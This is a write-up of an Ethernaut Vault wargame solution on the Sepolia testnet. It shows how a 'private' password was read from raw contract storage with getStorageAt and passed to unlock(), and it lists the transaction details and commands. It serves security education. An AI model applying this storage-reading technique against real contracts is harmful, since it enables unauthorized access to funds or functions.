# Transaction Report 01 — Ethernaut Vault Unlock

## Summary

This report analyzes the transaction used to unlock the Ethernaut Vault level.

The Vault contract stored a password in contract storage. Even though the password variable was marked `private`, the raw storage slot was publicly readable.

The exploit process was:

```text
read storage slot 1 -> extract password -> call unlock(password)
```

The final transaction called `unlock(bytes32)` with the password read from storage and changed the vault state from locked to unlocked.

## Transaction Overview

```text
Network:
Sepolia Testnet

Transaction Hash:
0x39bfd5b8194efd8e575407534e8ee5ab2e0e6453503cdd2e33563cda21fe289f

Status:
Success

Block:
11185980

External From:
0x926D6eA686964324290Fd4987141b5ED8e59b7Fa

External To:
0x3268568769091c72f9691fa5931ed34B399827Db

Value:
0 ETH

Transaction Fee:
0.000167881036505322 ETH

Function Called:
unlock(bytes32 _password)

Method ID:
0xec9b5b3a

Argument:
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

## Pre-Transaction Reconnaissance

Before sending the unlock transaction, the contract state was checked.

The vault was locked:

```text
locked = true
```

Storage slot `0` contained the boolean value for `locked`:

```text
0x0000000000000000000000000000000000000000000000000000000000000001
```

Interpretation:

```text
1 = true
```

Storage slot `1` contained the password:

```text
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

This showed that the private password was visible through raw blockchain storage.

## External Transaction

The external transaction was signed by the player wallet and sent directly to the Vault contract.

```text
player wallet -> Vault.unlock(password)
```

This was a write transaction because it changed contract state.

The transaction sent:

```text
0 ETH
```

But even with `0 ETH`, it still changed state because it called a state-changing function.

## Function Call

The transaction called:

```text
unlock(bytes32 _password)
```

With this argument:

```text
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

The contract compared the provided password with the stored password.

Because the argument matched the stored password, the contract executed:

```text
locked = false
```

## State Change

Before the transaction:

```text
locked = true
```

After the transaction:

```text
locked = false
```

This proves the exploit succeeded.

## Evidence Chain

```text
1. The Vault contract was initially locked.
2. Storage slot 1 was read publicly.
3. Slot 1 contained the password.
4. The player wallet called unlock(password).
5. The transaction succeeded.
6. The vault state changed from locked to unlocked.
```

## Key Lesson

The important lesson is that `private` does not mean secret.

A `private` Solidity variable cannot be directly accessed by another Solidity contract, but its raw storage can still be read from the blockchain.

For investigation and audit work, this means sensitive values should never be treated as hidden just because the source code marks them as `private`.

## Read vs Write Distinction

The exploit used both read operations and a write transaction.

Read operations:

```text
await contract.locked()
await web3.eth.getStorageAt(instance, 0)
await web3.eth.getStorageAt(instance, 1)
```

These did not require gas and did not change state.

Write transaction:

```text
await contract.unlock(password)
```

This required a transaction, used gas, and changed the contract state.

## Conclusion

The Vault level was unlocked by reading the supposedly private password from contract storage and submitting it to the `unlock(bytes32)` function.

The successful transaction and final `locked = false` state prove that the password exposure allowed unauthorized unlocking.
